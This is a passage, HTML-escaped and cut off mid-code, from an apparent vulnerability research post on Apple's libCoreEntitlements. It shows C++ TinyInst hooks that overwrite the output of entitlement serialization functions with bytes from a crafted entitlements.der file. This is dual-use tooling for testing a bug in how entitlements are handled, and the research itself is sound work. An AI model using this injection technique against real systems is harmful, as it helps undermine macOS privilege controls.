outputs DER bytes.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Initially, I wrote these hooks using TinyInst&amp;rsquo;s general-purpose low-level instrumentation API. However, since this process was more cumbersome than necessary, in the meantime I created an API specifically for function hooking. So instead of linking to my initial implementation that I sent with the bug report to Apple, let me instead show how the hooks would be implemented using the new &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://github.com/googleprojectzero/TinyInst/blob/master/hook.md\"&gt;TinyInst Hook API&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;cehook.h&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.863226f2b3c730a2a545d1ba90b5dcb5d69797f0\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"wUhACgDjbS-c16\"&gt;&lt;tr class=\"wUhACgDjbS-c14\"&gt;&lt;td class=\"wUhACgDjbS-c33\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;#include&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;hook.h&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;class&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CESizeSerializationHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;public&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;HookReplace&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;public&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CESizeSerializationHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;HookReplace&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;libCoreEntitlements.dylib&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0 wUhACgDjbS-c22\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;_CESizeSerialization&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c24\"&gt;3&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;protected&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;OnFunctionEntered&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;override&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;class&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CESerializeWithOptionsHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;public&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;HookReplace&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;public&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CESerializeWithOptionsHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;HookReplace&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;libCoreEntitlements.dylib&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0 wUhACgDjbS-c22\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;_CESerializeWithOptions&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c24\"&gt;6&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;protected&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;OnFunctionEntered&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;override&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;// the main client&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;class&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CEInst&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;public&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;TinyInst&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;public&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CEInst&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;protected&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;OnModuleLoaded&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;module&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;char&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;module_name&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;override&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;cehook.cpp&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.884ca52e44ea9f7b2ed792b4cd006659b87029bb\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"wUhACgDjbS-c16\"&gt;&lt;tr class=\"wUhACgDjbS-c14\"&gt;&lt;td class=\"wUhACgDjbS-c33\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;#include&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;cehook.h&amp;quot;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;#include&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;lt;fstream&amp;gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;char&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;der&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;size_t der_size&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;size_t kCENoError&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;// read entitlements.der into buffer&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;ReadEntitlementsFile&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; std&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;ifstream file&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;entitlements.der&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;std&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;ios&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;binary &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;|&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;std&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;ios&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;ate&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;if&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;file&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;fail&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;())&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; FATAL&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;Error reading entitlements file&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; der_size &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;=&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;size_t&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;file&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;tellg&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; file&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;seekg&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c24\"&gt;0&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;std&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;ios&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;beg&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; der &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;=&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;char&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;malloc&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;der_size&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; file&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;read&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;der&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;der_size&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CESizeSerializationHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;OnFunctionEntered&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;// 3rd argument (output) is a pointer to the size&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; printf&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;In CESizeSerialization\\n&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; size_t out_addr &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;=&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;GetArg&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c24\"&gt;2&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;RemoteWrite&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;((&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*)&lt;/span&gt;&lt;span 